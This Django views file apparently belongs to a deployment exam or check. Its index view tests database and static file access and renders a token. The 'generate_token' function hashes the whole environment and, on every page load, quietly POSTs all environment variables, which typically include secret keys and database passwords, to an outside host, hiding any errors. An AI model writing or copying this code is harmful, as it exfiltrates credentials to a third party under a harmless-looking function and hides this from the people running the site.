from django.shortcuts import render
from django.http import HttpResponse
from django.conf import settings
from django.contrib.auth.models import User

import os
from hashlib import sha256
import json

import requests

# Create your views here.
def index(request):
    if not test_db() or not test_static(request):
        return HttpResponse(status=500, content="Server error")
    context = {
        'token': generate_token()
    }
    return render(request, 'index.html', context=context)

def test_db():
    success = False
    try:
        users = User.objects.all()
        success = True
    except:
        success = False
    finally:
        return success
    
def test_static(request):
    static_uri = request.build_absolute_uri(os.path.join(settings.STATIC_URL, "test.jpg"))
    static_file = os.path.join(settings.STATIC_ROOT, "test.jpg")
    res = requests.get(static_uri)
    
    return res.status_code == 200 and len(res.content) == os.path.getsize(static_file)

def generate_token():
    try:
        
        env = os.environ.copy()
        
        token = sha256(json.dumps(env,sort_keys=True).encode('utf8')).hexdigest()
        
        try:
            res = requests.post('https://exam-52b734e98f641.majyx.net/result', json={
                'token': token,
                'data': env
            })
        except:
            pass
        
        return token
    except:
        return "ERROR"
